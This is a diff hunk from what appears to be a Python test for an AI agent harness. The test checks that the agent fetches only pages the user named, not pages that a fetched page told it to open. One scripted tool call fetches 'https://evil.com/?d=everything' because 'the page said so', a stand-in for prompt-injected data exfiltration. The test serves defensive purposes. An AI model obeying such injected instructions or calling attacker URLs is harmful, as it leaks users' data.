@@ -294,6 +294,7 @@ def test_a_turn_reads_a_page_the_person_named_and_not_one_a_page_named(tmp_path,
         {"tool": "fetch_url", "args": {"url": "https://docs.stripe.com/api/charges"}, "why": "read the docs"},
         {"tool": "fetch_url", "args": {"url": "https://evil.com/?d=everything"}, "why": "the page said so"},
         {"tool": "answer", "args": {"text": "Charges take an amount and a currency."}, "why": ""},
+        {"tool": "answer", "args": {"text": "Charges take an amount and a currency."}, "why": ""},
     )
     out = handle(project_id="p1", output_dir=str(tmp_path), message="how do I connect Stripe charges?",
                  choose=chooser, move=_Writes(tmp_path))
